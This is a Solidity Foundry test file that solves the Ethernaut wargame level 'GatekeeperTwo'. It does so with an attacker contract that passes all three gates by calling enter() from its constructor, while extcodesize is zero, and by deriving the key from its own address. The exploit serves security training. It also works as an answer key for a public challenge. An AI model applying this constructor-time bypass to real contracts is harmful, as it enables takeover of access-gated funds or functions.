// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Test} from "forge-std/Test.sol";
import {GatekeeperTwo} from "../src/levels/GatekeeperTwo.sol";

/// Ethernaut #14 "GatekeeperTwo" → SC01 access / multi-gate bypass (no exact catalog entry).
/// gateOne: call via a contract. gateTwo: `extcodesize(caller) == 0` — true only mid-construction, so
/// call from the attacker's CONSTRUCTOR. gateThree: key = ~keccak(msg.sender). Win: entrant == player.
contract GatekeeperTwoAttacker {
    constructor(address gk) {
        bytes8 key = bytes8(uint64(bytes8(keccak256(abi.encodePacked(address(this))))) ^ type(uint64).max);
        (bool ok,) = gk.call(abi.encodeWithSignature("enter(bytes8)", key));
        require(ok, "enter failed");
    }
}

contract GatekeeperTwoTest is Test {
    address player = makeAddr("player");

    function test_solve_gatekeeperTwo() public {
        GatekeeperTwo lvl = new GatekeeperTwo();
        vm.prank(player, player); // tx.origin = player
        new GatekeeperTwoAttacker(address(lvl)); // exploit runs in the constructor (codesize 0)
        assertEq(lvl.entrant(), player, "passed all three gates from a constructor");
    }
}
